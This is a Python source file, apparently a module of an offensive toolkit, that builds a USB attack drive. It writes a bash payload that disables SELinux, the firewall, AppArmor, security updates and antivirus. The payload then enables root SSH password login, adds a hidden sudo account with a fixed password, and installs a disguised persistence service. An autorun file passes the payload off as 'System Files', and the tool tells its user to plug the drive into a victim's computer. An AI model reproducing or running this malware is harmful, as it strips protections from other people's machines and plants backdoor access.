import os
import shutil
import stat
import subprocess
from colorama import Fore, Style
from utils.texts import t
from utils.helpers import clear_screen

def create_usb_virus(target_path):
    try:
        # Создаем скрипт для отключения защиты
        virus_content = """#!/bin/bash
# Отключение всех защитных механизмов
echo "[*] Disabling security systems..."

# Отключение SELinux
setenforce 0
sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config

# Отключение брандмауэра
systemctl stop firewalld
systemctl disable firewalld

# Отключение AppArmor
systemctl stop apparmor
systemctl disable apparmor

# Отключение обновлений безопасности
sed -i 's/^APT::Periodic::Update-Package-Lists.*/APT::Periodic::Update-Package-Lists "0";/' /etc/apt/apt.conf.d/10periodic
sed -i 's/^APT::Periodic::Unattended-Upgrade.*/APT::Periodic::Unattended-Upgrade "0";/' /etc/apt/apt.conf.d/20auto-upgrades

# Отключение антивирусных служб (если установлены)
if systemctl is-active --quiet clamav-daemon; then
    systemctl stop clamav-daemon
    systemctl disable clamav-daemon
fi

# Установка скрытого SSH-сервера
apt-get install -y openssh-server
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
systemctl restart ssh

# Создание скрытой учетной записи
useradd -m -s /bin/bash -G sudo .sysadmin
echo ".sysadmin:infected" | chpasswd

# Установка постоянного доступа
echo "[*] Setting up persistence..."
cat <<EOF > /etc/systemd/system/.systemd-service.service
[Unit]
Description=System Maintenance Service

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do sleep 60; done"

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable .systemd-service.service

# Скрытие процессов
echo "kernel.kptr_restrict = 0" >> /etc/sysctl.conf
echo "kernel.perf_event_paranoid = -1" >> /etc/sysctl.conf
sysctl -p

echo "[+] Security systems disabled! Backdoor installed."
"""

        # Создаем autorun скрипт
        autorun_content = """[autorun]
icon=system
label=System Files
action=Open system folder to view files
open=autorun.sh
"""

        # Пути для файлов на флешке
        virus_path = os.path.join(target_path, "autorun.sh")
        autorun_path = os.path.join(target_path, "autorun.inf")
        icon_path = os.path.join(target_path, "system.ico")

        # Запись файлов
        with open(virus_path, "w") as f:
            f.write(virus_content)
        
        with open(autorun_path, "w") as f:
            f.write(autorun_content)
        
        # Делаем скрипт исполняемым
        os.chmod(virus_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)

        # Копируем иконку (если есть)
        try:
            shutil.copy("/usr/share/icons/gnome/32x32/places/start-here.png", icon_path)
        except:
            pass

        print(f"{Fore.GREEN}[+] USB virus created at: {target_path}")
        print(f"{Fore.YELLOW}[!] Plug this USB into victim's computer{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

def usb_attack_creator():
    clear_screen()
    print(f"\n{Fore.MAGENTA}=== USB ATTACK CREATOR ==={Style.RESET_ALL}")
    
    # Автоматический поиск USB-накопителей
    usb_path = None
    try:
        mounts = subprocess.check_output("mount", shell=True).decode()
        for line in mounts.split('\n'):
            if '/media/' in line or '/mnt/' in line:
                parts = line.split()
                if len(parts) > 2 and parts[0].startswith('/dev/sd'):
                    usb_path = parts[2]
                    break
    except:
        pass

    if usb_path:
        print(f"{Fore.CYAN}[*] Detected USB at: {usb_path}{Style.RESET_ALL}")
        choice = input("> Use this path? (y/n): ").lower()
        if choice == 'y':
            create_usb_virus(usb_path)
            return

    # Ручной ввод пути
    path = input("> Enter USB mount path: ")
    if os.path.exists(path):
        create_usb_virus(path)
    else:
        print(f"{Fore.RED}Path does not exist!{Style.RESET_ALL}")
    
    input(f"\n{t('press_enter')}")